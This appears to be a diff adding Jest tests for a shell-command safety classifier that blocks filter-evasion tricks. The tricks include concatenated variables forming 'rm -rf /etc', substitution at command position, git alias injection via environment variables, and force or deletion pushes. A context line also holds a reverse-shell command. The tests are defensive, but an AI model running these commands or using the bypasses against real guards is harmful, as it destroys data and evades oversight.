@@ -772,6 +772,80 @@ describe("classifyCommand", () => {
     });
   });
 
+  describe("command-position expansion bypasses (round 5)", () => {
+    test("a=r; b=m; $a$b -rf /etc (concatenated variable expansion)", () => {
+      expect(classifyCommand("a=r; b=m; $a$b -rf /etc").ok).toBe(false);
+    });
+
+    test("cmd=git; sub=push; force=--force; $cmd $sub $force origin main", () => {
+      expect(
+        classifyCommand("cmd=git; sub=push; force=--force; $cmd $sub $force origin main").ok,
+      ).toBe(false);
+    });
+
+    test("$(echo rm) -rf /etc ($() at command position)", () => {
+      expect(classifyCommand("$(echo rm) -rf /etc").ok).toBe(false);
+    });
+
+    test("`echo rm` -rf /etc (backtick at command position)", () => {
+      expect(classifyCommand("`echo rm` -rf /etc").ok).toBe(false);
+    });
+
+    test("echo $(date) (command sub NOT at command position → allowed)", () => {
+      expect(classifyCommand("echo $(date)").ok).toBe(true);
+    });
+  });
+
+  describe("multi-segment git scanning (round 5)", () => {
+    test("git status | git push --force origin main (force in 2nd segment)", () => {
+      expect(classifyCommand("git status | git push --force origin main").ok).toBe(false);
+    });
+
+    test("git log; git reset --hard HEAD~1 (destructive in 2nd segment)", () => {
+      expect(classifyCommand("git log; git reset --hard HEAD~1").ok).toBe(false);
+    });
+
+    test("git fetch && git push --force origin main", () => {
+      expect(classifyCommand("git fetch && git push --force origin main").ok).toBe(false);
+    });
+  });
+
+  describe("git env-channel alias injection (round 5)", () => {
+    test("--config-env=alias.pu=VAR pu origin main", () => {
+      expect(classifyCommand("git --config-env=alias.pu=GIT_ALIAS pu origin main").ok).toBe(false);
+    });
+
+    test("GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=alias.pu GIT_CONFIG_VALUE_0='push --force' git pu", () => {
+      expect(
+        classifyCommand(
+          "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=alias.pu GIT_CONFIG_VALUE_0='push --force' git pu origin main",
+        ).ok,
+      ).toBe(false);
+    });
+  });
+
+  describe("git push destructive-mode detection (round 5)", () => {
+    test("git push origin :main (deletion refspec)", () => {
+      expect(classifyCommand("git push origin :main").ok).toBe(false);
+    });
+
+    test("git push origin --delete main", () => {
+      expect(classifyCommand("git push origin --delete main").ok).toBe(false);
+    });
+
+    test("git push origin -d main (short delete)", () => {
+      expect(classifyCommand("git push origin -d main").ok).toBe(false);
+    });
+
+    test("git push --mirror origin", () => {
+      expect(classifyCommand("git push --mirror origin").ok).toBe(false);
+    });
+
+    test("git push origin main (non-destructive → allowed)", () => {
+      expect(classifyCommand("git push origin main").ok).toBe(true);
+    });
+  });
+
   describe("ClassificationResult shape", () => {
     test("blocked result has all required fields", () => {
       const result = classifyCommand("bash -i >& /dev/tcp/x/4444 0>&1");
